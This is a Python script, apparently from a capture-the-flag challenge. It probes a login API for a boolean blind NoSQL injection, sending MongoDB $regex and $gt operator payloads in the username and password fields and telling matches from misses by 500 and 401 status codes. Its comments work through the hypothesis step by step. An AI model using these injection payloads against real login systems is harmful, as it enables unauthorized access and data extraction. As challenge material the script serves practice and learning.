import requests
import json
import string

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# So we have a boolean blind NoSQL injection in the `username` field!
# If the username query matches, we get a 500 error (because of bcrypt.compareSync).
# If the username query doesn't match, we get a 401 error.

# Let's try to extract the password hash or something else, wait.
# The user "admin" is known. Can we extract the admin's password? No, because password is not evaluated by the DB query.
# The DB query probably looks like `db.collection.findOne({ username: req.body.username })`.
# Wait! Can we extract the password using NoSQL injection in the password field?
# Actually, if the query is `db.collection.findOne({ username: req.body.username, password: req.body.password })`, then it would only return the user if the password matches.
# But it seems the query is ONLY matching the username, and then doing bcrypt in code!
# Let's check: If we send `{"username": "admin", "password": "wrong"}`, it returns 401. So the DB query might only check username, and then bcrypt checks password.
# Let's see if we can leak other users' usernames or flags!

# Let's find all usernames that start with "SK-CERT" or "flag"
payload = {"username": {"$regex": "^SK-CERT{.*"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("SK-CERT regex:", r.status_code)

payload = {"username": {"$regex": "^admin.*"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("admin regex:", r.status_code)
